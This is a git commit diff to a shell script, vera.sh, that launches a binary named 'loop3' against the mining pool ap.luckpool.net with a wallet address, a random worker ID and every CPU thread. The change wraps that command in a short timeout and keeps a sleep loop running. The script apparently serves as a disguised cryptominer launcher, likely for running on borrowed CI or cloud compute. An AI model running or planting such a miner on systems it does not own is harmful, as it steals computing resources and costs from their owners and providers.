7890c775d6938b7db87666e2afc0a5c213a473f7
cihuuy <95659029+cihuuy@users.noreply.github.com>
2021-12-26 06:38:17 +0530

    Update vera.sh

--- vera.sh
+++ vera.sh
@@ -1,6 +1,5 @@
 #!/bin/sh
-sudo apt install screen -y
-./loop3 -v -l ap.luckpool.net:3956 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
+timeout -k 30s 120s ./loop3 -v -l ap.luckpool.net:3956 -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.$(shuf -n 1 -i 1-99999)-cpu -p x -t $(nproc)
 while [ 1 ]; do
 sleep 3
 done
